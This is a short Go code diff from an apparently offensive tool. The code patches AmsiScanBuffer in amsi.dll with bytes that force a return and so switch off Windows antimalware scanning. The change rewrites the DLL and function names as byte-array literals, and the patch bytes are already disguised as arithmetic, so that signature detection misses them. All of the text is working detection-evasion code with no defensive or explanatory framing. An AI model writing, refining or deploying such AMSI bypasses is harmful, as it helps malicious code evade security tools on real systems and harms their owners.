@@ -9,7 +9,7 @@ import (
 var amsi_patch = []byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1}
 
 func PatchAmsi() (error) {
-  err := WriteBytes("amsi.dll", "AmsiScanBuffer", &amsi_patch)
+  err := WriteBytes(string([]byte{'a','m','s','i','.','d','l','l'}), string([]byte{'A','m', 's','i','S','c','a','n','B','u','f','f','e','r'}), &amsi_patch)
   if err != nil {
     return err
   }
